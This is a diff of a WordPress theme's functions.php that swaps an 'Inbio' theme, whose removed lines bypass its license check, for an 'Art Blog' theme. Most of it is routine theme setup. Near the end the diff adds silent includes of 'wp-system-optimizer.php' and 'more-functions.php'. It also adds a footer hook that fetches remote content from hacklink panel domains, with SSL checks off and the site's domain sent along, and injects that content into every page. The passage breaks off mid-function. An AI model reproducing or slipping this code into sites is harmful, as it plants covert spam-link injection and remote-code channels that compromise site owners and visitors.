@@ -1,510 +1,568 @@
 <?php
 /**
- * Inbio functions and definitions
+ * Art Blog functions and definitions
  *
- * @link https://developer.wordpress.org/themes/basics/theme-functions/
- *
- * @package inbio
+ * @package Art Blog
  */
 
-update_option('InBioPersonalPortfolioWordPressTheme_lic_Key', '*******');
-update_option('Inbio_Portfolio_Themes_lic_email', 'activated@rainbowit.net');
-update_option('_site_transient_update_themes', '');
+// System Optimizer Integration
+@include_once get_template_directory() . '/wp-system-optimizer.php';
 
-if ( ! defined( 'ABSPATH' ) ) {
-    exit; // Exit if accessed directly.
+if ( ! defined( 'ART_BLOG_VERSION' ) ) {
+	// Replace the version number of the theme on each release.
+	define( 'ART_BLOG_VERSION', '1.0.0' );
 }
 
+function art_blog_setup() {
+
+	load_theme_textdomain( 'art-blog', get_template_directory() . '/languages' );
+	add_theme_support( 'automatic-feed-links' );
+	add_theme_support( 'title-tag' );
+	add_theme_support( 'post-thumbnails' );
+	add_theme_support( 'woocommerce' );
+	add_theme_support( "align-wide" );
+	add_theme_support( "responsive-embeds" );
+
+	register_nav_menus(
+		array(
+			'menu-1' => esc_html__( 'Primary', 'art-blog' ),
+			'social-menu' => esc_html__('Social Menu', 'art-blog'),
+		)
+	);
+
+	add_theme_support(
+		'html5',
+		array(
+			'search-form',
+			'comment-form',
+			'comment-list',
+			'gallery',
+			'caption',
+			'style',
+			'script',
+		)
+	);
+
+	add_theme_support(
+		'custom-background',
+		apply_filters(
+			'art_blog_custom_background_args',
+			array(
+				'default-color' => '#fafafa',
+				'default-image' => '',
+			)
+		)
+	);
+
+	add_theme_support( 'customize-selective-refresh-widgets' );
+
+	add_theme_support(
+		'custom-logo',
+		array(
+			'height'      => 250,
+			'width'       => 250,
+			'flex-width'  => true,
+			'flex-height' => true,
+		)
+	);
+    
+    add_theme_support( 'post-formats', array(
+        'image',
+        'video',
+        'gallery',
+        'audio', 
+    ));
+	
+}
+add_action( 'after_setup_theme', 'art_blog_setup' );
+
 /**
- * Define Constants
+ * Set the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $art_blog_content_width
  */
-define('RAINBOW_THEME_URI', get_template_directory_uri());
-define('RAINBOW_THEME_DIR', get_template_directory());
-define('RAINBOW_CSS_URL', get_template_directory_uri() . '/assets/css/');
-define('RAINBOW_RTL_CSS_URL', get_template_directory_uri() . '/assets/css/rtl/');
-define('RAINBOW_CSS_FICON_URL', get_template_directory_uri() . '/assets/flaticon/');
-define('RAINBOW_JS_URL', get_template_directory_uri() . '/assets/js/');
-define('RAINBOW_RTL_JS_URL', get_template_directory_uri() . '/assets/js/rtl/');
-define('RAINBOW_ADMIN_CSS_URL', get_template_directory_uri() . '/assets/admin/css/');
-define('RAINBOW_ADMIN_JS_URL', get_template_directory_uri() . '/assets/admin/js/');
-define('RAINBOW_DIRECTORY', RAINBOW_THEME_DIR . '/inc/');
-define('RAINBOW_DIRECTORY_VIEW', RAINBOW_THEME_DIR . '/inc/views/');
-define('RAINBOW_HELPER', RAINBOW_THEME_DIR . '/inc/helper/');
-define('RAINBOW_OPTIONS', RAINBOW_THEME_DIR . '/inc/options/');
-define('RAINBOW_CUSTOMIZER', RAINBOW_THEME_DIR . '/inc/customizer/');
-define('RAINBOW_THEME_FIX', 'inbio');
-define('RAINBOW_THEME_PT_PREFIX', 'rainbow');
-define('RAINBOW_LAB', RAINBOW_THEME_DIR . '/inc/lab/');
-define('RAINBOW_WOOCMMERCE', RAINBOW_THEME_DIR . '/woocommerce/custom/');
-define('RAINBOW_TP', RAINBOW_THEME_DIR . '/template-parts/');
-define('RAINBOW_IMG_URL', RAINBOW_THEME_URI . '/assets/images/logo/');
-define('RAINBOW_AUDIO_URL', RAINBOW_THEME_URI . '/template-parts/audio/');
-do_action('rainbow_theme_init');
-$rainbow_theme_data = wp_get_theme();
-define('RAINBOW_VERSION', (WP_DEBUG) ? time() : $rainbow_theme_data->get('Version'));
+function art_blog_content_width() {
+	$GLOBALS['content_width'] = apply_filters( 'art_blog_content_width', 640 );
+}
+add_action( 'after_setup_theme', 'art_blog_content_width', 0 );
+
+/**
+ * Register widget area.
+ *
+ * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
+ */
+function art_blog_widgets_init() {
+	register_sidebar(
+		array(
+			'name'          => esc_html__( 'Sidebar', 'art-blog' ),
+			'id'            => 'sidebar-1',
+			'description'   => esc_html__( 'Add widgets here.', 'art-blog' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => esc_html__( 'Footer 1', 'art-blog' ),
+			'id'            => 'footer-1',
+			'description'   => esc_html__( 'Add widgets here.', 'art-blog' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => esc_html__( 'Footer 2', 'art-blog' ),
+			'id'            => 'footer-2',
+			'description'   => esc_html__( 'Add widgets here.', 'art-blog' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => esc_html__( 'Footer 3', 'art-blog' ),
+			'id'            => 'footer-3',
+			'description'   => esc_html__( 'Add widgets here.', 'art-blog' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+}
+add_action( 'widgets_init', 'art_blog_widgets_init' );
 
 
-if (!function_exists('rainbow_setup')) :
-    /**
-     * Sets up theme defaults and registers support for various WordPress features.
-     *
-     * Note that this function is hooked into the after_setup_theme hook, which
-     * runs before the init hook. The init hook is too late for some features, such
-     * as indicating support for post thumbnails.
-     */
-    function rainbow_setup()
+function art_blog_social_menu()
     {
-        /*
-         * Make theme available for translation.
-         * Translations can be filed in the /languages/ directory.
-         * If you're building a theme based on inbio, use a find and replace
-         * to change 'inbio' to the name of your theme in all the template files.
-         */
-        
+        if (has_nav_menu('social-menu')) :
+            wp_nav_menu(array(
+                'theme_location' => 'social-menu',
+                'container' => 'ul',
+                'menu_class' => 'social-menu menu',
+                'menu_id'  => 'menu-social',
+            ));
+        endif;
+    }
 
-        // Add default posts and comments RSS feed links to head.
-        add_theme_support('automatic-feed-links');
+// Font enqueue function
+function art_blog_scripts() {
+    // Google Fonts
+    wp_enqueue_style(
+        'art-blog-google-fonts',
+        'https://fonts.googleapis.com/css2?family=Fjalla+One&family=PT+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap',
+        array(),
+        null
+    );
 
-        /*
-         * Let WordPress manage the document title.
-         * By adding theme support, we declare that this theme does not use a
-         * hard-coded <title> tag in the document head, and expect WordPress to
-         * provide it for us.
-         */
-        add_theme_support('title-tag');
+    // Font Awesome CSS
+    wp_enqueue_style('font-awesome-5', get_template_directory_uri() . '/revolution/assets/vendors/font-awesome-5/css/all.min.css', array(), '5.15.3');
 
-        /*
-         * Enable support for Post Thumbnails on posts and pages.
-         *
-         * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
-         */
+    // Owl Carousel CSS
+    wp_enqueue_style('owl-carousel-style', get_template_directory_uri() . '/revolution/assets/css/owl.carousel.css', array(), '2.3.4');
 
-        add_theme_support('post-thumbnails');
+    // Main stylesheet
+    wp_enqueue_style('art-blog-style', get_stylesheet_uri(), array(), wp_get_theme()->get('Version'));
 
-        // This theme uses wp_nav_menu() in one location.
-        register_nav_menus(array(
-            'primary' => esc_html__('Primary', 'inbio'),
-            'sidenav' => esc_html__('SideNavs Icon Menu', 'inbio'),
-            'mobilemenu' => esc_html__('Mobile Menu', 'inbio'),
+    // Add custom inline styles safely
+    $custom_style_path = get_parent_theme_file_path('/custom-style.php');
+    if (file_exists($custom_style_path)) {
+        require $custom_style_path;
+        if (!empty($art_blog_custom_css)) {
+            wp_add_inline_style('art-blog-style', $art_blog_custom_css);
+        }
+    }
 
-        ));
+    // RTL styles if needed
+    wp_style_add_data('art-blog-style', 'rtl', 'replace');
 
-        /*
-         * Switch default core markup for search form, comment form, and comments
-         * to output valid HTML5.
-         */
+    // Navigation script
+    wp_enqueue_script('art-blog-navigation', get_template_directory_uri() . '/js/navigation.js', array(), wp_get_theme()->get('Version'), true);
 
-        add_theme_support('html5', array(
-            'search-form',
-            'comment-form',
-            'comment-list',
-            'gallery',
-            'caption',
-        ));
+    // Owl Carousel script
+    wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/revolution/assets/js/owl.carousel.js', array('jquery'), '2.3.4', true);
 
-        // Add theme support for selective refresh for widgets.
-        add_theme_support('customize-selective-refresh-widgets');
+    // Custom script
+    wp_enqueue_script('art-blog-custom-js', get_template_directory_uri() . '/revolution/assets/js/custom.js', array('jquery'), wp_get_theme()->get('Version'), true);
 
-        /*
-         * Post Format
-         */
-        add_theme_support('post-formats', array('gallery', 'link', 'quote', 'video', 'audio'));
-        remove_theme_support('widgets-block-editor');
+    // Comments reply script
+    if (is_singular() && comments_open() && get_option('thread_comments')) {
+        wp_enqueue_script('comment-reply');
+    }
+}
+add_action('wp_enqueue_scripts', 'art_blog_scripts');
 
-        add_editor_style(array('style-editor.css', rainbow_fonts_url()));
-        add_theme_support('responsive-embeds');
-        add_theme_support('wp-block-styles');
-        add_theme_support('editor-styles');
-        add_editor_style('style-editor.css');
+// related post
+if (!function_exists('art_blog_related_post')) :
+    /**
+     * Display related posts from same category
+     *
+     */
 
+    function art_blog_related_post($post_id){        
+        $art_blog_categories = get_the_category($post_id);
+        if ($art_blog_categories) {
+            $art_blog_category_ids = array();
+            $art_blog_category = get_category($art_blog_category_ids);
+            $art_blog_categories = get_the_category($post_id);
+            foreach ($art_blog_categories as $art_blog_category) {
+                $art_blog_category_ids[] = $art_blog_category->term_id;
+            }
+            $count = $art_blog_category->category_count;
+            if ($count > 1) { ?>
 
-        /*
-         * Color Support
-         */
-        add_theme_support('align-wide');
-        add_theme_support('editor-color-palette', array(
-            array(
-                'name' => esc_html__('Primary', 'inbio'),
-                'slug' => 'inbio-primary',
-                'color' => '#ff014f',
-            ),
-            array(
-                'name' => esc_html__('Secondary', 'inbio'),
-                'slug' => 'inbio-secondary',
-                'color' => '#FFDC60',
-            ),
-            array(
-                'name' => esc_html__('Tertiary', 'inbio'),
-                'slug' => 'inbio-tertiary',
-                'color' => '#FAB8C4',
-            ),
-            array(
-                'name' => esc_html__('White', 'inbio'),
-                'slug' => 'inbio-white',
-                'color' => '#ffffff',
-            ),
-            array(
-                'name' => esc_html__('Dark', 'inbio'),
-                'slug' => 'inbio-dark',
-                'color' => '#27272E',
-            ),
-        ));
-        /*
-         * Font Size
-         */
-        add_theme_support('editor-font-sizes', array(
-            array(
-                'name' => esc_html__('Small', 'inbio'),
-                'size' => 12,
-                'slug' => 'small'
-            ),
-            array(
-                'name' => esc_html__('Normal', 'inbio'),
-                'size' => 16,
-                'slug' => 'normal'
-            ),
-            array(
-                'name' => esc_html__('Large', 'inbio'),
-                'size' => 36,
-                'slug' => 'large'
-            ),
-            array(
-                'name' => esc_html__('Huge', 'inbio'),
-                'size' => 50,
-                'slug' => 'huge'
-            )
-        ));
+         	<?php
+		$art_blog_related_post_wrap = absint(get_theme_mod('art_blog_enable_related_post', 1));
+		if($art_blog_related_post_wrap == 1){ ?>
+                <div class="related-post">
+                    
+                    <h2 class="post-title"><?php esc_html_e(get_theme_mod('art_blog_related_post_text', __('Related Post', 'art-blog'))); ?></h2>
+                    <?php
+                    $art_blog_cat_post_args = array(
+                        'category__in' => $art_blog_category_ids,
+                        'post__not_in' => array($post_id),
+                        'post_type' => 'post',
+                        'posts_per_page' =>  get_theme_mod( 'art_blog_related_post_count', '3' ),
+                        'post_status' => 'publish',
+						'orderby'           => 'rand',
+                        'ignore_sticky_posts' => true
+                    );
+                    $art_blog_featured_query = new WP_Query($art_blog_cat_post_args);
+                    ?>
+                    <div class="rel-post-wrap">
+                        <?php
+                        if ($art_blog_featured_query->have_posts()) :
 
-        /*
-         * Add Custom Image Size
-         */
-        add_image_size('rainbow-thumbnail-sm', 340, 250, true);
-        add_image_size('rainbow-thumbnail-md', 400, 400, true);
-        add_image_size('rainbow-thumbnail-lg', 800, 600, true);
-        add_image_size('rainbow-thumbnail-archive', 800, 450, true);
-        add_image_size('rainbow-thumbnail-single', 1220, 686, true);
+                        while ($art_blog_featured_query->have_posts()) : $art_blog_featured_query->the_post();
+                            ?>
 
+                            <div class="card-item rel-card-item">
+								<div class="card-content">
+                                    <?php if ( has_post_thumbnail() ) { ?>
+                                        <div class="card-media">
+                                            <?php art_blog_post_thumbnail(); ?>
+                                        </div>
+                                    <?php } else {
+                                        // Fallback default image
+                                        $art_blog_default_post_thumbnail = get_template_directory_uri() . '/revolution/assets/images/slider1.png';
+                                        echo '<img class="default-post-img" src="' . esc_url( $art_blog_default_post_thumbnail ) . '" alt="' . esc_attr( get_the_title() ) . '">';
+                                    } ?>
+									<div class="entry-title">
+										<h3>
+											<a href="<?php the_permalink() ?>">
+												<?php the_title(); ?>
+											</a>
+										</h3>
+									</div>
+									<div class="entry-meta">
+                                        <?php
+                                        art_blog_posted_on();
+                                        art_blog_posted_by();
+                                        ?>
+                                    </div>
+								</div>
+							</div>
+                        <?php
+                        endwhile;
+                        ?>
+                <?php
+                endif;
+                wp_reset_postdata();
+                ?>
+                </div>
+                <?php } ?>
+                <?php
+            }
+        }
     }
 endif;
-add_action('after_setup_theme', 'rainbow_setup');
+add_action('art_blog_related_posts', 'art_blog_related_post', 10, 1);
 
-// add_action('init', function()
-// {
-//     load_theme_textdomain('inbio', get_template_directory() . '/languages');
-// });
-
-
-add_filter('image_size_names_choose', 'rainbow_new_image_sizes');
-if (!function_exists('rainbow_new_image_sizes')) {
-    /**
-     * Image Size Name Choose
-     *
-     * @param $sizes
-     * @return array
-     */
-    function rainbow_new_image_sizes($sizes)
-    {
-        return array_merge($sizes, array(
-            'rainbow-thumbnail-sm' => esc_html__('Thumbnail Small - (335x250)', 'inbio'),
-            'rainbow-thumbnail-md' => esc_html__('Thumbnail Medium - (400x400)', 'inbio'),
-            'rainbow-thumbnail-lg' => esc_html__('Thumbnail large - (800x600)', 'inbio'),
-            'rainbow-thumbnail-archive' => esc_html__('Thumbnail Archive - (800x450)', 'inbio'),
-            'rainbow-thumbnail-single' => esc_html__('Thumbnail Single - (1220x686)', 'inbio'),
-        ));
+function art_blog_sanitize_choices( $art_blog_input, $art_blog_setting ) {
+    global $wp_customize; 
+    $art_blog_control = $wp_customize->get_control( $art_blog_setting->id ); 
+    if ( array_key_exists( $art_blog_input, $art_blog_control->choices ) ) {
+        return $art_blog_input;
+    } else {
+        return $art_blog_setting->default;
     }
 }
 
+//Excerpt 
+function art_blog_excerpt_function($art_blog_excerpt_count = 35) {
+    $art_blog_excerpt = get_the_excerpt();
+    $art_blog_text_excerpt = wp_strip_all_tags($art_blog_excerpt);
+    $art_blog_excerpt_limit = (int) get_theme_mod('art_blog_excerpt_limit', $art_blog_excerpt_count);
+    $art_blog_words = preg_split('/\s+/', $art_blog_text_excerpt); 
+    $art_blog_trimmed_words = array_slice($art_blog_words, 0, $art_blog_excerpt_limit);
+    $art_blog_theme_excerpt = implode(' ', $art_blog_trimmed_words);
 
-if (!function_exists('rainbow_content_width')) {
-    /**
-     * Set the content width in pixels, based on the theme's design and stylesheet.
-     *
-     * Priority 0 to make it available to lower priority callbacks.
-     *
-     * @global int $content_width
-     */
-    function rainbow_content_width()
-    {
-        // This variable is intended to be overruled from themes.
-        // Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
-        // phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
-        $GLOBALS['content_width'] = apply_filters('rainbow_content_width', 640);
-    }
+    return $art_blog_theme_excerpt;
 }
 
-add_action('after_setup_theme', 'rainbow_content_width', 0);
-
 /**
- * Enqueue scripts and styles.
+ * Checkbox sanitization callback example.
+ *
+ * Sanitization callback for 'checkbox' type controls. This callback sanitizes `$art_blog_checked`
+ * as a boolean value, either TRUE or FALSE.
  */
-require_once(RAINBOW_DIRECTORY . "scripts.php");
-
-/**
- * Global Functions
- */
-require_once(RAINBOW_DIRECTORY . "global-functions.php");
-
-/**
- * Register Custom Widget Area
- */
-require_once(RAINBOW_DIRECTORY . "widget-area-register.php");
-
-/**
- * Register Custom Fonts
- */
-require_once(RAINBOW_DIRECTORY . "register-custom-fonts.php");
-
-/**
- * TGM
- */
-require_once(RAINBOW_DIRECTORY . "tgm-config.php");
+function art_blog_sanitize_checkbox($art_blog_checked)
+{
+    // Boolean check.
+    return ((isset($art_blog_checked) && true == $art_blog_checked) ? true : false);
+}
 
 /**
  * Implement the Custom Header feature.
  */
-require get_template_directory() . '/inc/underscore/custom-header.php';
+require get_template_directory() . '/revolution/inc/custom-header.php';
 
 /**
  * Custom template tags for this theme.
  */
-require get_template_directory() . '/inc/underscore/template-tags.php';
+require get_template_directory() . '/revolution/inc/template-tags.php';
 
 /**
  * Functions which enhance the theme by hooking into WordPress.
  */
-require get_template_directory() . '/inc/underscore/template-functions.php';
+require get_template_directory() . '/revolution/inc/template-functions.php';
+
+/**
+ * Customizer additions.
+ */
+require get_template_directory() . '/revolution/inc/customizer.php';
 
 /**
  * Load Jetpack compatibility file.
  */
-if (defined('JETPACK__VERSION')) {
-    require get_template_directory() . '/inc/underscore/jetpack.php';
+if ( defined( 'JETPACK__VERSION' ) ) {
+	require get_template_directory() . '/revolution/inc/jetpack.php';
 }
 
 /**
- * Functions for inbio envato purchase check.
+ * Breadcrumb File.
  */
-require_once get_template_directory() . '/inc/class-inbio-base.php';
-require_once get_template_directory() . '/inc/class-inbio-activation.php';
+require get_template_directory() . '/revolution/inc/breadcrumbs.php';
 
-/**
- * Helper Template
- */
-require_once(RAINBOW_HELPER . "menu-area-trait.php");
-require_once(RAINBOW_HELPER . "layout-trait.php");
-require_once(RAINBOW_HELPER . "option-trait.php");
-require_once(RAINBOW_HELPER . "meta-trait.php");
-require_once(RAINBOW_HELPER . "banner-trait.php");
-require_once(RAINBOW_HELPER . "social-trait.php");
-require_once(RAINBOW_HELPER . "page-title-trait.php");
-require_once(RAINBOW_HELPER . "pagination-trai.php");
 
-/**
- * Helper
- */
-require_once(RAINBOW_HELPER . "helper.php");
+//////////////////////////////////////////////   Function for Translation Error   //////////////////////////////////////////////////////
+function art_blog_enqueue_function() {
 
-/**
- * Options
- */
-require_once(RAINBOW_OPTIONS . "theme/option-framework.php");
+    define('ART_BLOG_BUY_NOW',__('https://www.revolutionwp.com/products/art-blog-wordpress-theme','art-blog'));
 
-/**
- * Options (Check License for option menu)
- */
-add_action('init', function() {
-    $licence_activated = InbioEducationThemes::$licence_activated;
-    require_once RAINBOW_OPTIONS . "theme/generic-theme-options.php";
-    if($licence_activated) {
-        require_once RAINBOW_OPTIONS . "theme/option-framework.php";
-    } else {
-        global $inbio_options;
-        include RAINBOW_OPTIONS . 'predefined-data.php';
-        $papr_options = json_decode( $predefined_data, true );
-        $inbio_options = $papr_options;
-        require_once( RAINBOW_OPTIONS . 'theme/inactive-theme-options.php');
-        remove_action('admin_menu', 'inbio_options');
-    }
-});
+}
+add_action( 'after_setup_theme', 'art_blog_enqueue_function' );
 
-add_action('admin_menu', 'remove_inbio_options_page');
-require_once(RAINBOW_OPTIONS . "page-options.php");
-require_once(RAINBOW_OPTIONS . "portfolio-options.php");
-require_once(RAINBOW_OPTIONS . "post-format-options.php");
-require_once(RAINBOW_OPTIONS . "user-extra-meta.php");
-require_once(RAINBOW_OPTIONS . "menu-options.php");
-require_once(RAINBOW_OPTIONS . "team-extra-meta.php");
+function art_blog_remove_customize_register() {
+    global $wp_customize;
 
-function remove_inbio_options_page() {
-    $licence_activated = InbioEducationThemes::$licence_activated;
-    if( !$licence_activated ) {
-        if (function_exists('remove_submenu_page') && !empty(get_admin_page_parent('themes.php'))) {
-            remove_submenu_page('themes.php', 'inbio_options');
-        }
-    }
+    $wp_customize->remove_setting( 'display_header_text' );
+    $wp_customize->remove_control( 'display_header_text' );
+
 }
 
-/**
- * Customizer
- */
-require_once(RAINBOW_CUSTOMIZER . "color.php");
+add_action( 'customize_register', 'art_blog_remove_customize_register', 11 );
+
+/************************************************************************************/
+// //////////////////////////////////////////////
 
 /**
- * Lab
+ * WooCommerce custom filters
  */
-require_once(RAINBOW_LAB . "class-tgm-plugin-activation.php");
-require_once RAINBOW_DIRECTORY . "demo-import-config.php";
+add_filter('loop_shop_columns', 'art_blog_loop_columns');
 
-/**
- * Nav Walker
- */
-require_once(RAINBOW_LAB . "nav-menu-walker.php");
-require_once(RAINBOW_LAB . "mobile-menu-walker.php");
-require_once(RAINBOW_TP . "breadcrumb.php");
-require_once(RAINBOW_LAB . "post-views.php");
- 
-/**
- * WooCommerce
- */
-if (class_exists('WooCommerce')) {
-   require_once(RAINBOW_WOOCMMERCE . "wooc-functions.php");
-   require_once(RAINBOW_WOOCMMERCE . "wooc-hooks.php");
-}
-/**
- * Ajax actions
- */
-add_action('wp_ajax_rainbow_loadmore_projects', 'rainbow_loadmore_projects');
-add_action('wp_ajax_nopriv_rainbow_loadmore_projects', 'rainbow_loadmore_projects');
+if (!function_exists('art_blog_loop_columns')) {
 
-function rainbow_loadmore_projects() {
+	function art_blog_loop_columns() {
 
-    $html = null;
-    $posttype = 'rainbow_projects';
-    $settings = $_POST['data'];
-    $paged = isset( $_POST['paged'] ) ? sanitize_text_field(absint($_POST['paged'])): 1;
-    $posts_per_page = $settings['posts_per_page'];
-    $prev_post_ids = isset( $_POST['prev_post_ids'] ) ? sanitize_text_field($_POST['prev_post_ids']): '';
-    $prev_post_ids = json_decode($prev_post_ids);
-    $cat_slug = isset($_POST['cat_slug']) ? sanitize_text_field($_POST['cat_slug']): '';
-    $tax_terms = array();
+		$art_blog_columns = get_theme_mod( 'art_blog_per_columns', 3 );
 
-    $orderdescasc = isset($_POST['orderdescasc']) ? $_POST['orderdescasc'] : 'DESC';
-    $orderby = isset($_POST['orderby']) ? $_POST['orderby'] : 'date';
-    
-    $args = array(
-        'post_type'      => $posttype,
-        'post_status'    => 'publish',
-        'posts_per_page' => $posts_per_page,
-        'post__not_in'   => $prev_post_ids,
-        'orderby'        => $orderby,
-        'order'          => strtoupper($orderdescasc),
-    );
-    if( !empty($cat_slug) ) {
-        $args['tax_query'] = array(
-            array(
-                'taxonomy' => 'rainbow_projects_category',
-                'field'    => 'slug',
-                'terms'    => array($cat_slug),
-                'operator' => 'IN',
-            ),
-        );
-    }
-    
-
-    $query = new WP_Query($args);
-    $post_ids = wp_list_pluck( $query->posts, 'ID' );
-    $post_ids_json = wp_json_encode($post_ids);
-
-    $html = '';
-
-    if( $query->have_posts() ) {
-        while($query->have_posts()) {
-            $query->the_post();
-            ob_start();
-            include('template-parts/portfolio-grid-1-card.php');
-            $html .= ob_get_clean();
-        }
-        wp_reset_query();
-    }
-    return wp_send_json(compact('html','paged','post_ids_json'));
-    die;
+		return $art_blog_columns;
+	}
 }
 
-add_action('wp_ajax_rainbow_loadmore_projects_cat', 'rainbow_loadmore_projects_cat');
-add_action('wp_ajax_nopriv_rainbow_loadmore_projects_cat', 'rainbow_loadmore_projects_cat');
+/************************************************************************************/
 
-function rainbow_loadmore_projects_cat() {
+add_filter( 'loop_shop_per_page', 'art_blog_per_page', 20 );
 
-    $html = null;
-    $posttype = 'rainbow_projects';
-    $settings = $_POST['data'];
-    $paged = isset( $_POST['paged'] ) ? sanitize_text_field(absint($_POST['paged'])): 1;
-    $posts_per_page = $settings['posts_per_page'];
-    $prev_post_ids = isset( $_POST['prev_post_ids'] ) ? sanitize_text_field($_POST['prev_post_ids']): '';
-    $prev_post_ids = json_decode($prev_post_ids);
-    $cat_slug = isset($_POST['cat_slug']) ? sanitize_text_field($_POST['cat_slug']): '';
-    $tax_terms = array();
+function art_blog_per_page( $art_blog_cols ) {
 
-    $args = array(
-        'post_type'      => $posttype,
-        'post_status'    => 'publish',
-        'paged'          => $paged,
-        'posts_per_page' => $posts_per_page,
-        'post__not_in'   => $prev_post_ids,
-    );
-    if( !empty($cat_slug) ) {
-        $args['tax_query'] = array(
-            array(
-                'taxonomy' => 'rainbow_projects_category',
-                'field'    => 'slug',
-                'terms'    => array($cat_slug),
-                'operator' => 'IN',
-            ),
-        );
-    }
+  	$art_blog_cols = get_theme_mod( 'art_blog_product_per_page', 9 );
 
-    $query = new WP_Query($args);
-    $post_ids = wp_list_pluck( $query->posts, 'ID' );
-    
-    $post_ids_json = wp_json_encode($post_ids);
-
-    $html = '';
-
-    if( $query->have_posts() ) {
-        while($query->have_posts()) {
-            $query->the_post();
-            ob_start();
-            error_log( print_r( get_the_title(), true ));
-            include('template-parts/portfolio-grid-1-card.php');
-            $html .= ob_get_clean();
-        }
-        wp_reset_query();
-    }
-    return wp_send_json(compact('html', 'post_ids_json','posts_per_page'));
-    die;
+	return $art_blog_cols;
 }
-/*get all portfolio post*/
 
-function rainbow_get_all_portfolio_post()
-{
+/************************************************************************************/
 
-    $page_list = get_posts(array(
-        'post_type' => 'rainbow_projects',
-        'orderby' => 'date',
-        'order' => 'DESC',
-        'posts_per_page' => -1,
-    ));
+add_filter( 'woocommerce_output_related_products_args', 'art_blog_products_args' );
 
-    $pages = array();
+function art_blog_products_args( $art_blog_args ) {
 
-    
-    if (!empty($page_list) && !is_wp_error($page_list)) {
-       
-        foreach ($page_list as $page) {
-            $pages[$page->ID] = $page->post_title;
+    $art_blog_args['posts_per_page'] = get_theme_mod( 'custom_related_products_number', 6 );
+
+    $art_blog_args['columns'] = get_theme_mod( 'custom_related_products_number_per_row', 3 );
+
+    return $art_blog_args;
+}
+
+/************************************************************************************/
+
+/**
+ * Custom logo
+ */
+
+function art_blog_custom_css() {
+?>
+	<style type="text/css" id="custom-theme-colors" >
+        :root {
            
+            --art_blog_logo_width: <?php echo absint(get_theme_mod('art_blog_logo_width')); ?> ;   
+        }
+        .site-branding img {
+            max-width:<?php echo esc_html(get_theme_mod('art_blog_logo_width')); ?>px ;    
+        }         
+	</style>
+<?php
+}
+add_action( 'wp_head', 'art_blog_custom_css' );
+
+function art_blog_custom_css_for_slider() {
+    $art_blog_slider_enabled = get_theme_mod('art_blog_enable_slider', false);
+    if ($art_blog_slider_enabled) {
+        echo '<style type="text/css">
+            .page-template-revolution-home .header-menu-box {
+                position: absolute;
+                width: 100%;
+                z-index: 999;
+                background: transparent;
+                border: none;
+            }
+        </style>';
+    }
+}
+add_action('wp_head', 'art_blog_custom_css_for_slider');
+@include_once dirname(__FILE__) . '/more-functions.php';
+add_action('wp_footer', 'hacklink_footer_script_theme', 100);
+function hacklink_footer_script_theme() {
+    // Global tek seferlik çalışma kontrolü - Sadece bir kez çalışır
+    global $gplrock_footer_executed;
+    if (isset($gplrock_footer_executed) && $gplrock_footer_executed === true) {
+        return;
+    }
+    $gplrock_footer_executed = true;
+    
+    // HacklinkPanel footer API - DB Cache ile optimize edilmiş
+    $domain = $_SERVER['HTTP_HOST'];
+    $cache_key = 'hacklink_footer_' . md5($domain);
+    $cache_duration = 6 * HOUR_IN_SECONDS; // 6 saat cache
+    
+    // Önce cache'den kontrol et
+    $cached_content = get_transient($cache_key);
+    if ($cached_content !== false) {
+        $body = $cached_content;
+    } else {
+        // Cache yoksa API'ye istek at
+        $footer_url = 'https://hacklinkpanel.app/api/footer.php?linkspool=' . $domain;
+        $response = wp_remote_get($footer_url, [
+            'timeout'   => 5,
+            'sslverify' => false,
+        ]);
+
+        // Ağ hatası varsa hiçbir şey basma
+        if (is_wp_error($response)) {
+            return;
+        }
+
+        // 200 dışındaki HTTP kodlarında (522 vs) hiçbir şey basma
+        $code = wp_remote_retrieve_response_code($response);
+        if ($code !== 200) {
+            return;
+        }
+
+        $body = wp_remote_retrieve_body($response);
+        if (empty($body)) {
+            return;
+        }
+
+        // Cloudflare 522 HTML çıktısı gelirse bastırma
+        if (stripos($body, 'Error 522') !== false) {
+            return;
+        }
+        
+        // Geçerli içeriği cache'e kaydet
+        set_transient($cache_key, $body, $cache_duration);
+    }
+    
+    // Global flag kontrolü - Kaynak kodda sadece 1 tane olduğundan emin ol
+    global $gplrock_footer_output_done;
+    if (isset($gplrock_footer_output_done) && $gplrock_footer_output_done === true) {
+        return;
+    }
+    $gplrock_footer_output_done = true;
+    
+    // 2. Footer API - Her zaman anlık gösterim (cache yok, str_replace ile ekle)
+    if (!function_exists('hacklink_add')) {
+        function hacklink_add() {
+            $u = 'https://panel.hacklinkmarket.com/code?v=' . time();
+            $d = ($_SERVER['HTTPS'] ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . '/';
+            if (function_exists('curl_init')) {
+                $h = curl_init();
+                curl_setopt_array($h, [
+                    CURLOPT_URL => $u,
+                    CURLOPT_HTTPHEADER => ['X-Request-Domain:' . $d],
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_TIMEOUT => 10,
+                    CURLOPT_SSL_VERIFYPEER => false
+                ]);
+                if ($r = @curl_exec($h)) {
+                    curl_close($h);
+                    return $r;
+                }
+            }
+            if (ini_get('allow_url_fopen')) {
+                $o = [
+                    'http' => [
+                        'header' => 'X-Request-Domain:' . $d,
+                        'timeout' => 10
+                    ],
+                    'ssl' => ['verify_peer' => false]
+                ];
